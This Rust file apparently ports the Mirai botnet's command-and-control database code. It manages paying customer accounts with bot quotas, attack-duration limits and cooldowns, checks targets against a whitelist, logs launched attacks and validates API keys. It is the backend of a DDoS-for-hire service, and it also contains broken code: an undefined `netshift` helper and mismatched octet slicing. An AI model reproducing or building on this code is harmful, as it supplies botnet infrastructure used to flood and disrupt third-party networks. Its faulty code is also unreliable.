use std::collections::HashMap;
use std::error::Error;
use std::net::IpAddr;
use std::sync::{Arc, Mutex};
use mysql::*;
use mysql::prelude::*;
use std::time::{Duration, SystemTime};

struct Database {
    conn: Pool,
}

struct AccountInfo {
    username: String,
    max_bots: i32,
    admin: i32,
}

impl Database {
    fn new(db_addr: &str, db_user: &str, db_password: &str, db_name: &str) -> Self {
        let url = format!("mysql://{}:{}@{}/{}", db_user, db_password, db_addr, db_name);
        let pool = Pool::new(url).expect("Failed to create database pool");
        println!("MySQL DB opened");
        Database { conn: pool }
    }

    fn try_login(&self, username: &str, password: &str) -> Result<Option<AccountInfo>, Box<dyn Error>> {
        let mut conn = self.conn.get_conn()?;
        let query = "SELECT username, max_bots, admin FROM users WHERE username = ? AND password = ? AND (wrc = 0 OR (UNIX_TIMESTAMP() - last_paid < `intvl` * 24 * 60 * 60))";
        let result: Option<(String, i32, i32)> = conn.exec_first(query, (username, password))?;

        if let Some((username, max_bots, admin)) = result {
            Ok(Some(AccountInfo {
                username,
                max_bots,
                admin,
            }))
        } else {
            Ok(None)
        }
    }

    fn create_user(&self, username: &str, password: &str, max_bots: i32, duration: i32, cooldown: i32) -> Result<bool, Box<dyn Error>> {
        let mut conn = self.conn.get_conn()?;
        let user_exists: Option<String> = conn.exec_first("SELECT username FROM users WHERE username = ?", (username,))?;
        if user_exists.is_some() {
            return Ok(false);
        }
        conn.exec_drop("INSERT INTO users (username, password, max_bots, admin, last_paid, cooldown, duration_limit) VALUES (?, ?, ?, 0, UNIX_TIMESTAMP(), ?, ?)",
                       (username, password, max_bots, cooldown, duration))?;
        Ok(true)
    }

    fn contains_whitelisted_targets(&self, attack: &Attack) -> Result<bool, Box<dyn Error>> {
        let mut conn = self.conn.get_conn()?;
        let mut whitelist = conn.query_map("SELECT prefix, netmask FROM whitelist", |(prefix, netmask): (String, u8)| (prefix, netmask))?;
        
        for (prefix, netmask) in &whitelist {
            let ip: IpAddr = prefix.parse()?;
            let ip_octets = match ip {
                IpAddr::V4(ipv4) => ipv4.octets(),
                IpAddr::V6(ipv6) => ipv6.octets(),
            };
            let i_whitelist_prefix = u32::from_be_bytes(ip_octets[12..].try_into().unwrap());

            for (a_p_network_order, a_n) in &attack.targets {
                let i_attack_prefix = u32::from_be_bytes(a_p_network_order.to_be_bytes());

                if *a_n > *netmask {
                    if netshift(i_whitelist_prefix, *netmask) == netshift(i_attack_prefix, *netmask) {
                        return Ok(true);
                    }
                } else if *a_n < *netmask {
                    if (i_attack_prefix >> *a_n) == (i_whitelist_prefix >> *a_n) {
                        return Ok(true);
                    }
                } else {
                    if i_whitelist_prefix == i_attack_prefix {
                        return Ok(true);
                    }
                }
            }
        }
        Ok(false)
    }

    fn can_launch_attack(&self, username: &str, duration: u32, full_command: &str, max_bots: i32, allow_concurrent: i32) -> Result<(bool, Option<String>), Box<dyn Error>> {
        let mut conn = self.conn.get_conn()?;
        let query = "SELECT id, duration_limit, cooldown FROM users WHERE username = ?";
        let result: Option<(u32, u32, u32)> = conn.exec_first(query, (username,))?;
        if result.is_none() {
            return Ok((false, Some("Your access has been terminated".to_string())));
        }
        let (user_id, duration_limit, cooldown) = result.unwrap();

        if duration_limit != 0 && duration > duration_limit {
            return Ok((false, Some(format!("You may not send attacks longer than {} seconds.", duration_limit))));
        }

        if allow_concurrent == 0 {
            let query = "SELECT time_sent, duration FROM history WHERE user_id = ? AND (time_sent + duration + ?) > UNIX_TIMESTAMP()";
            let concurrent_check: Option<(u32, u32)> = conn.exec_first(query, (user_id, cooldown))?;
            if let Some((time_sent, history_duration)) = concurrent_check {
                return Ok((false, Some(format!("Please wait {} seconds before sending another attack", (time_sent + history_duration + cooldown) - SystemTime::now().duration_since(SystemTime::UNIX_EPOCH)?.as_secs() as u32))));
            }
        }

        conn.exec_drop("INSERT INTO history (user_id, time_sent, duration, command, max_bots) VALUES (?, UNIX_TIMESTAMP(), ?, ?, ?)",
                       (user_id, duration, full_command, max_bots))?;
        Ok((true, None))
    }

    fn check_api_code(&self, apikey: &str) -> Result<Option<AccountInfo>, Box<dyn Error>> {
        let mut conn = self.conn.get_conn()?;
        let result: Option<(String, i32, i32)> = conn.exec_first("SELECT username, max_bots, admin FROM users WHERE api_key = ?", (apikey,))?;
        if let Some((username, max_bots, admin)) = result {
            Ok(Some(AccountInfo {
                username,
                max_bots,
                admin,
            }))
        } else {
            Ok(None)
        }
    }
}

struct Attack {
    targets: HashMap<u32, u8>,
}
